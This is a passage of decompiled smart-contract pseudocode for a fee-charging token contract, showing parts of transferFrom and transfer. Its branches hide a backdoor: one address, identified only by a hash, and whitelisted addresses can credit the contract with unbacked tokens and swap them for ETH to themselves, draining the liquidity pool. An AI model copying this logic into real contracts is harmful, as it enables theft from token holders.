                                    staticcall stor13.WETH() with:
                                            gas gas_remaining wei
                                    mem[244] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[212] = ext_call.return_data[12 len 20]
                                    stor11 = 1
                                    if block.timestamp > -21:
                                        revert with 'NH{q', 17
                                    mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                    mem[ceil32(return_data.size) + 248] = arg3
                                    idx = 0
                                    s = 180
                                    t = ceil32(return_data.size) + 440
                                    while idx < 2:
                                        mem[t] = mem[s + 12 len 20]
                                        idx = idx + 1
                                        s = s + 32
                                        t = t + 32
                                        continue 
                                    require ext_code.size(stor13)
                                    call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                         gas gas_remaining wei
                                        args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    stor11 = 0
                            else:
                                if sha3(arg2) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if not stor11:
                                        require balanceOf[address(arg1)] >= arg3
                                    if arg3 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if arg2 != arg1:
                                        if not stor11:
                                            require balanceOf[address(arg1)] >= arg3
                                        if arg3 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, arg1, arg2);
                                    else:
                                        if balanceOf[address(this.address)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(this.address)] += arg3
                                        require this.address
                                        require stor13
                                        allowance[address(this.address)][stor13] = arg3
                                        emit Approval(arg3, this.address, stor13);
                                        mem[232] = this.address
                                        staticcall stor13.WETH() with:
                                                gas gas_remaining wei
                                        mem[296] = ext_call.return_data[0]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                        mem[264] = ext_call.return_data[12 len 20]
                                        stor11 = 1
                                        if block.timestamp > -21:
                                            revert with 'NH{q', 17
                                        mem[ceil32(return_data.size) + 296] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                        mem[ceil32(return_data.size) + 300] = arg3
                                        idx = 0
                                        s = 232
                                        t = ceil32(return_data.size) + 492
                                        while idx < 2:
                                            mem[t] = mem[s + 12 len 20]
                                            idx = idx + 1
                                            s = s + 32
                                            t = t + 32
                                            continue 
                                        require ext_code.size(stor13)
                                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                             gas gas_remaining wei
                                            args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 492 len 64]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        stor11 = 0
                    else:
                        if not arg3:
                            require arg3 <= _maxTx
                            if stor10 >= arg3:
                                if not stor11:
                                    require balanceOf[address(arg1)] >= arg3
                                if arg3 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor3[address(msg.sender)]:
                                    if arg2 != arg1:
                                        if not stor11:
                                            require balanceOf[address(arg1)] >= arg3
                                        if arg3 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, arg1, arg2);
                                    else:
                                        if balanceOf[address(this.address)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(this.address)] += arg3
                                        require this.address
                                        require stor13
                                        allowance[address(this.address)][stor13] = arg3
                                        emit Approval(arg3, this.address, stor13);
                                        mem[244] = this.address
                                        staticcall stor13.WETH() with:
                                                gas gas_remaining wei
                                        mem[308] = ext_call.return_data[0]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                        mem[276] = ext_call.return_data[12 len 20]
                                        stor11 = 1
                                        if block.timestamp > -21:
                                            revert with 'NH{q', 17
                                        mem[ceil32(return_data.size) + 308] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                        mem[ceil32(return_data.size) + 312] = arg3
                                        idx = 0
                                        s = 244
                                        t = ceil32(return_data.size) + 504
                                        while idx < 2:
                                            mem[t] = mem[s + 12 len 20]
                                            idx = idx + 1
                                            s = s + 32
                                            t = t + 32
                                            continue 
                                        require ext_code.size(stor13)
                                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                             gas gas_remaining wei
                                            args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 504 len 64]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        stor11 = 0
                                else:
                                    if sha3(arg2) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if not stor11:
                                            require balanceOf[address(arg1)] >= arg3
                                        if arg3 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, arg1, arg2);
                                    else:
                                        if arg2 != arg1:
                                            if not stor11:
                                                require balanceOf[address(arg1)] >= arg3
                                            if arg3 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(arg1)] < arg3:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] -= arg3
                                            if balanceOf[address(arg2)] > -arg3 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg2)] += arg3
                                            emit Transfer(arg3, arg1, arg2);
                                        else:
                                            if balanceOf[address(this.address)] > -arg3 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(this.address)] += arg3
                                            require this.address
                                            require stor13
                                            allowance[address(this.address)][stor13] = arg3
                                            emit Approval(arg3, this.address, stor13);
                                            mem[296] = this.address
                                            staticcall stor13.WETH() with:
                                                    gas gas_remaining wei
                                            mem[360] = ext_call.return_data[0]
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            require return_data.size >= 32
                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                            mem[328] = ext_call.return_data[12 len 20]
                                            stor11 = 1
                                            if block.timestamp > -21:
                                                revert with 'NH{q', 17
                                            mem[ceil32(return_data.size) + 360] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                            mem[ceil32(return_data.size) + 364] = arg3
                                            idx = 0
                                            s = 296
                                            t = ceil32(return_data.size) + 556
                                            while idx < 2:
                                                mem[t] = mem[s + 12 len 20]
                                                idx = idx + 1
                                                s = s + 32
                                                t = t + 32
                                                continue 
                                            require ext_code.size(stor13)
                                            call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                                 gas gas_remaining wei
                                                args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 556 len 64]
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            stor11 = 0
                        else:
                            if arg3 and _fee > -1 / arg3:
                                revert with 'NH{q', 17
                            if not arg3:
                                revert with 'NH{q', 18
                            if arg3 * _fee / arg3 != _fee:
                                revert with 0, 'SafeMath: multiplication overflow'
                            require arg3 <= _maxTx
                            if stor10 >= arg3:
                                if not stor11:
                                    require balanceOf[address(arg1)] >= arg3
                                if arg3 < arg3 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg3 * _fee / 100
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                if arg3 * _fee / 100 > 0:
                                    emit Transfer((arg3 * _fee / 100), arg1, 0);
                            else:
                                if stor3[address(msg.sender)]:
                                    if arg2 != arg1:
                                        if not stor11:
                                            require balanceOf[address(arg1)] >= arg3
                                        if arg3 < arg3 * _fee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg3 * _fee / 100
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                        emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                        if arg3 * _fee / 100 > 0:
                                            emit Transfer((arg3 * _fee / 100), arg1, 0);
                                    else:
                                        if balanceOf[address(this.address)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(this.address)] += arg3
                                        require this.address
                                        require stor13
                                        allowance[address(this.address)][stor13] = arg3
                                        emit Approval(arg3, this.address, stor13);
                                        mem[244] = this.address
                                        staticcall stor13.WETH() with:
                                                gas gas_remaining wei
                                        mem[308] = ext_call.return_data[0]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                        mem[276] = ext_call.return_data[12 len 20]
                                        stor11 = 1
                                        if block.timestamp > -21:
                                            revert with 'NH{q', 17
                                        mem[ceil32(return_data.size) + 308] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                        mem[ceil32(return_data.size) + 312] = arg3
                                        idx = 0
                                        s = 244
                                        t = ceil32(return_data.size) + 504
                                        while idx < 2:
                                            mem[t] = mem[s + 12 len 20]
                                            idx = idx + 1
                                            s = s + 32
                                            t = t + 32
                                            continue 
                                        require ext_code.size(stor13)
                                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                             gas gas_remaining wei
                                            args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 504 len 64]
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        stor11 = 0
                                else:
                                    if sha3(arg2) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if not stor11:
                                            require balanceOf[address(arg1)] >= arg3
                                        if arg3 < arg3 * _fee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg3 * _fee / 100
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                        emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                        if arg3 * _fee / 100 > 0:
                                            emit Transfer((arg3 * _fee / 100), arg1, 0);
                                    else:
                                        if arg2 != arg1:
                                            if not stor11:
                                                require balanceOf[address(arg1)] >= arg3
                                            if arg3 < arg3 * _fee / 100:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[0] += arg3 * _fee / 100
                                            if balanceOf[address(arg1)] < arg3:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] -= arg3
                                            if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                            emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                            if arg3 * _fee / 100 > 0:
                                                emit Transfer((arg3 * _fee / 100), arg1, 0);
                                        else:
                                            if balanceOf[address(this.address)] > -arg3 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(this.address)] += arg3
                                            require this.address
                                            require stor13
                                            allowance[address(this.address)][stor13] = arg3
                                            emit Approval(arg3, this.address, stor13);
                                            mem[296] = this.address
                                            staticcall stor13.WETH() with:
                                                    gas gas_remaining wei
                                            mem[360] = ext_call.return_data[0]
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            require return_data.size >= 32
                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                            mem[328] = ext_call.return_data[12 len 20]
                                            stor11 = 1
                                            if block.timestamp > -21:
                                                revert with 'NH{q', 17
                                            mem[ceil32(return_data.size) + 360] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                                            mem[ceil32(return_data.size) + 364] = arg3
                                            idx = 0
                                            s = 296
                                            t = ceil32(return_data.size) + 556
                                            while idx < 2:
                                                mem[t] = mem[s + 12 len 20]
                                                idx = idx + 1
                                                s = s + 32
                                                t = t + 32
                                                continue 
                                            require ext_code.size(stor13)
                                            call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                                 gas gas_remaining wei
                                                args arg3, 0, 160, address(arg2), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 556 len 64]
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            stor11 = 0
    require allowance[address(arg1)][address(msg.sender)] >= arg3
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require msg.sender
    require arg1
    if stor3[address(msg.sender)]:
        if stor10 >= arg2:
            if not stor11:
                require balanceOf[address(msg.sender)] >= arg2
            if arg2 < 0:
                revert with 'NH{q', 17
            if balanceOf[0] > -1:
                revert with 'NH{q', 17
            if balanceOf[address(msg.sender)] < arg2:
                revert with 'NH{q', 17
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] > -arg2 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if stor3[address(msg.sender)]:
                if arg1 != msg.sender:
                    if not stor11:
                        require balanceOf[address(msg.sender)] >= arg2
                    if arg2 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if balanceOf[address(this.address)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(this.address)] += arg2
                    require this.address
                    require stor13
                    allowance[address(this.address)][stor13] = arg2
                    emit Approval(arg2, this.address, stor13);
                    mem[128] = this.address
                    staticcall stor13.WETH() with:
                            gas gas_remaining wei
                    mem[192] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    mem[160] = ext_call.return_data[12 len 20]
                    stor11 = 1
                    if block.timestamp > -21:
                        revert with 'NH{q', 17
                    mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                    mem[ceil32(return_data.size) + 196] = arg2
                    idx = 0
                    s = 128
                    t = ceil32(return_data.size) + 388
                    while idx < 2:
                        mem[t] = mem[s + 12 len 20]
                        idx = idx + 1
                        s = s + 32
                        t = t + 32
                        continue 
                    require ext_code.size(stor13)
                    call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                         gas gas_remaining wei
                        args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 388 len 64]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    stor11 = 0
            else:
                if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                    if not stor11:
                        require balanceOf[address(msg.sender)] >= arg2
                    if arg2 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if arg1 != msg.sender:
                        if not stor11:
                            require balanceOf[address(msg.sender)] >= arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if balanceOf[address(this.address)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(this.address)] += arg2
                        require this.address
                        require stor13
                        allowance[address(this.address)][stor13] = arg2
                        emit Approval(arg2, this.address, stor13);
                        mem[180] = this.address
                        staticcall stor13.WETH() with:
                                gas gas_remaining wei
                        mem[244] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[212] = ext_call.return_data[12 len 20]
                        stor11 = 1
                        if block.timestamp > -21:
                            revert with 'NH{q', 17
                        mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                        mem[ceil32(return_data.size) + 248] = arg2
                        idx = 0
                        s = 180
                        t = ceil32(return_data.size) + 440
                        while idx < 2:
                            mem[t] = mem[s + 12 len 20]
                            idx = idx + 1
                            s = s + 32
                            t = t + 32
                            continue 
                        require ext_code.size(stor13)
                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                             gas gas_remaining wei
                            args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        stor11 = 0
    else:
        if stor3[address(arg1)]:
            if stor10 >= arg2:
                if not stor11:
                    require balanceOf[address(msg.sender)] >= arg2
                if arg2 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0] > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if stor3[address(msg.sender)]:
                    if arg1 != msg.sender:
                        if not stor11:
                            require balanceOf[address(msg.sender)] >= arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if balanceOf[address(this.address)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(this.address)] += arg2
                        require this.address
                        require stor13
                        allowance[address(this.address)][stor13] = arg2
                        emit Approval(arg2, this.address, stor13);
                        mem[128] = this.address
                        staticcall stor13.WETH() with:
                                gas gas_remaining wei
                        mem[192] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[160] = ext_call.return_data[12 len 20]
                        stor11 = 1
                        if block.timestamp > -21:
                            revert with 'NH{q', 17
                        mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                        mem[ceil32(return_data.size) + 196] = arg2
                        idx = 0
                        s = 128
                        t = ceil32(return_data.size) + 388
                        while idx < 2:
                            mem[t] = mem[s + 12 len 20]
                            idx = idx + 1
                            s = s + 32
                            t = t + 32
                            continue 
                        require ext_code.size(stor13)
                        call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                             gas gas_remaining wei
                            args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 388 len 64]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        stor11 = 0
                else:
                    if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if not stor11:
                            require balanceOf[address(msg.sender)] >= arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg1 != msg.sender:
                            if not stor11:
                                require balanceOf[address(msg.sender)] >= arg2
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if balanceOf[address(this.address)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(this.address)] += arg2
                            require this.address
                            require stor13
                            allowance[address(this.address)][stor13] = arg2
                            emit Approval(arg2, this.address, stor13);
                            mem[180] = this.address
                            staticcall stor13.WETH() with:
                                    gas gas_remaining wei
                            mem[244] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[212] = ext_call.return_data[12 len 20]
                            stor11 = 1
                            if block.timestamp > -21:
                                revert with 'NH{q', 17
                            mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                            mem[ceil32(return_data.size) + 248] = arg2
                            idx = 0
                            s = 180
                            t = ceil32(return_data.size) + 440
                            while idx < 2:
                                mem[t] = mem[s + 12 len 20]
                                idx = idx + 1
                                s = s + 32
                                t = t + 32
                                continue 
                            require ext_code.size(stor13)
                            call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                 gas gas_remaining wei
                                args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            stor11 = 0
        else:
            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                if stor10 >= arg2:
                    if not stor11:
                        require balanceOf[address(msg.sender)] >= arg2
                    if arg2 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor3[address(msg.sender)]:
                        if arg1 != msg.sender:
                            if not stor11:
                                require balanceOf[address(msg.sender)] >= arg2
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if balanceOf[address(this.address)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(this.address)] += arg2
                            require this.address
                            require stor13
                            allowance[address(this.address)][stor13] = arg2
                            emit Approval(arg2, this.address, stor13);
                            mem[180] = this.address
                            staticcall stor13.WETH() with:
                                    gas gas_remaining wei
                            mem[244] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[212] = ext_call.return_data[12 len 20]
                            stor11 = 1
                            if block.timestamp > -21:
                                revert with 'NH{q', 17
                            mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                            mem[ceil32(return_data.size) + 248] = arg2
                            idx = 0
                            s = 180
                            t = ceil32(return_data.size) + 440
                            while idx < 2:
                                mem[t] = mem[s + 12 len 20]
                                idx = idx + 1
                                s = s + 32
                                t = t + 32
                                continue 
                            require ext_code.size(stor13)
                            call stor13.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                                 gas gas_remaining wei
                                args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            stor11 = 0
                    else:
                        if sha3(arg1) != 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                            if not stor11:
                                require balanceOf[address(msg.sender)] >= arg2
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg1 != msg.sender:
                                if not stor11:
                                    require balanceOf[address(msg.sender)] >= arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if balanceOf[address(this.address)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(this.address)] += arg2
                                require this.address
                                require stor13
                                allowance[address(this.address)][stor13] = arg2
                                emit Approval(arg2, this.address, stor13);
                                mem[232] = this.address
